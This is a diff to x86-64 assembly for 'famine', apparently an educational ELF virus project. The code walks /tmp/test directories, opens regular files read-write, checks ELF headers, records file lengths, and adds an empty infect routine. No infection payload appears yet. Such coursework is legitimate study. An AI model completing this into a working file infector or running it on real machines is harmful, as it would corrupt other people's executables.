@@ -11,7 +11,6 @@ section .text
     dirs db         "/tmp/test",0,"/tmp/test2",0,0
 
     _start:
-
     mov rbp, rsp
     sub rbp, famine_size            ;generate stack
 
@@ -59,7 +58,7 @@ section .text
                 push rax
                 lea rsi, [rdi]
                 mov rdi, VAR(famine.fd_dir)
-                mov rdx, O_RDONLY
+                mov rdx, O_RDWR 
                 mov rax, SC_OPENAT
                 syscall
                 test rax, rax
@@ -80,9 +79,8 @@ section .text
                 and eax, S_IFMT             ; bytes file type
                 cmp eax, S_IFREG            ; reg file type
                 jne .close_file
-                mov eax, dword [rsp + 24]   ; st-mode again
-                and eax, 0o777
-                mov dword VAR(famine.file_permissions), eax
+                mov rax, [rsp + 48]
+                mov VAR(famine.file_original_len), rax 
                 jmp .magic_numbers
                 
                 .end_fstat:
@@ -90,6 +88,7 @@ section .text
                     jmp .close_file 
 
             .magic_numbers:
+                TRACE_TEXT hello, 11
                 mov rdi, VAR(famine.fd_file)
                 lea rsi, VAR(famine.elf_ehdr)
                 mov rdx, 64   
@@ -105,12 +104,12 @@ section .text
                 cmp byte VAR(famine.elf_ehdr + 5), 1     ;EI_CLASS
                 jne .close_file
 
-            .fchmod:
-                mov rdi, VAR(famine.fd_file)
-                mov rsi, 0o777
-                mov rax, SC_FCHMOD
-                syscall
-            
+            ; .fchmod:
+            ;     mov rdi, VAR(famine.fd_file)
+            ;     mov rsi, 0o777
+            ;     mov rax, SC_FCHMOD
+            ;     syscall
+
                 .close_file:
                 mov rdi, VAR(famine.fd_file)
                 mov rax, SC_CLOSE
@@ -149,3 +148,5 @@ section .text
             mov rax, SC_EXIT
             syscall
     
+    infect:
+        
